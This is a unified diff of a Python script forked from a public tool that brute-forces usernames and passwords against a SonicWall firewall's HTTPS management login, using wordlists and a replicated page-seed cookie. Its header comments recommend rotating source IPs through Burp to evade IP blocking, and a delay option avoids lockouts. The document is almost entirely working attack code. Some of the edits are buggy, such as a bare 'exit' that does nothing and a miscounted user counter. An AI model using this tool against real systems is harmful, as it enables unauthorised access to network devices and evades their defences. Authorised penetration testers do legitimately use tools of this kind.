@@ -1,18 +1,41 @@
 #!/usr/bin/python3
 
-# Script to brute force logins on SonicWall
-#
-# Drew Kirkpatrick
-# drew.kirkpatrick@gmail.com
-# @hoodoer
-#
-#
-# Based on:
+# SonicWallBruteForce (j0mbie's version)
+# 
+# Script to brute force credentials against a SonicWall HTTPS management page.
+# 
+# Forked from Hoodoer's work:  
+# https://github.com/hoodoer/sonicWallBruteForce
+# 
+# Based on gist by Vasuman to do autologins:  
 # https://gist.github.com/vasuman/fa750a6fe57fc8a73aff
-
-
-# Todo
-# multithreading/performance
+# 
+# 
+# SonicWall can be pretty IP blocking happy. Consider using the HTTP proxy feature to pass
+# this through Burp, and use IPRotate extension to snag a new source IP for every request. See:  
+# https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874
+#   
+#   
+# Prerequisites:  
+# 
+# Python 3
+# Windows installer: https://www.python.org/downloads/release/python-3114/
+# 
+# "Requests" Python package
+# In Windows, from your Python directory, run:
+# `Scripts\pip.exe install requests
+# 
+#  
+# Options:
+# 
+# -host          URL of the target. Example: https://somesonicwall.xyz (Required.)
+# -userlist      User list, in a text file. One entry per line.
+# -password      Single password to try. Useful for testing the script.
+# -passwordlist  Password list, in a text file. One entry per line.
+# -proxy         HTTP proxy.
+# -delay         How many seconds to wait before moving to the next password in the list.
+# -debug         Print a lot of extra stuff.
+# 
 
 
 import time
@@ -58,11 +81,12 @@ def bake_cookies(p):
     cookies = {}
     seedString = p.param2 + password
     seedString = seedString.encode('utf-8')
+
     page_seed = md5(seedString).hexdigest()
 
     if debug:
         print("PageSeed: " + page_seed)
-    
+
     cookies['PageSeed'] = page_seed
     # Dunno?
     cookies['temp'] = 'temp'
@@ -88,7 +112,7 @@ def make_form(p):
 # This should be what sets up our class
 def req_login_page():
     if proxy is None:
-        resp = requests.get(LOGIN_PORTAL, verify = VERIFY)
+        resp = requests.get(LOGIN_PORTAL, verify = VERIFY, timeout=2.50)
     else:
         resp = requests.get(LOGIN_PORTAL, verify = VERIFY, proxies=proxies)
 
@@ -98,8 +122,9 @@ def req_login_page():
     	print("Login page response: " + str(resp.status_code))
     	print("Login page content: " + str(resp.text))
     	print("********************************************")
-
+    	
     parser = InputFieldParser()
+
     parser.feed(resp.text)
 
     return parser
@@ -109,27 +134,34 @@ def req_login_page():
 
 
 def do_login():
-    p = req_login_page()
 
-    cookies = bake_cookies(p)
-    form    = make_form(p)
+    try:
 
-    # Check if we're using a proxy (e.g. Burp)
-    if proxy is None:
-        login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY)
-    else:
-        login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY, proxies=proxies)
+        p = req_login_page()
 
-    if login_req.status_code != 200:
-        # Creds didn't work
-        return False
-    if login_req.text.find('auth.html') != -1:
-        # Creds didn't work
-        return False
+        cookies = bake_cookies(p)
 
-    # If we're here, the creds worked
-    # <insert happy dance>
-    return True
+        form    = make_form(p)
+
+        # Check if we're using a proxy (e.g. Burp)
+        if proxy is None:
+            login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY, timeout=2.50)
+        else:
+            login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY, proxies=proxies)
+
+        if login_req.status_code != 200:
+            # Creds didn't work
+            return False
+        if login_req.text.find('auth.html') != -1:
+            # Creds didn't work
+            return False
+
+        # If we're here, the creds worked
+        # <insert happy dance>
+        return True
+
+    except:
+        print("An error occured on password: " + password)
 
 
 
@@ -225,42 +257,56 @@ def main():
     # Loppity loop loop time. 
     global user
     global PasswordCount
-    global iCounter
+    global UserCounter
+    global PasswordCounter
 
+    UserCount = len(users)
     PasswordCount = len(passwords)
-    print("Password Count: " + str(PasswordCount))
+    print("Total user count: " + str(UserCount))
+    print("Total password count: " + str(PasswordCount))
+    print("Total combinations: " + str(UserCount * PasswordCount))
     
+    UserCounter = 0
     
     for user in users:
 
-        iCounter = 0
+        PasswordCounter = 0
         
         for password in passwords:
-            user     = user.strip('\n')
-            password = password.strip('\n')
 
-            iCounter = iCounter + 1
-            print("Current Count: " + str(iCounter) + "/" + str(PasswordCount))
+            PasswordCounter = PasswordCounter + 1
 
-            if debug:
-                print("Trying (" + user + ":" + password + ")")
+            try:
+                
+                user     = user.strip('\n')
+                password = password.strip('\n')
 
-            if do_login():
-                print("Success! " + user + ":" + password)
-                break
-            else:
+                UserCounter = UserCounter + 1
+                print("User " + str(UserCounter) + " of " + str(UserCount) + ". Password " + str(PasswordCounter) + " of " + str(PasswordCount) + ". Trying: " + user + " | " + password)
+
                 if debug:
-                    print("Invalid credentials")
-                    print("Failed - (" + user + ":" + "password" + ")")
+                    print("Trying: " + user + " | " + password)
+
+                if do_login():
+                    print("Success!:  " + user + " | " + password)
+                    exit
+                else:
+                    if debug:
+                        print("Invalid credentials: " + user + " | " + password)
+
+            except:
+
+                print("An error occured on password: " + password)
 
         # Should we wait between password cycles? To avoid lockouts/blocking?
         if delay is not None:
-            print("Password loop done, waiting " + str(delay) + " seconds...")
+            print("Password loop done. Waiting " + str(delay) + " seconds...")
             time.sleep(int(delay))
 
         
 
     print("Done.")
+    exit
 
 
 if __name__ == '__main__':
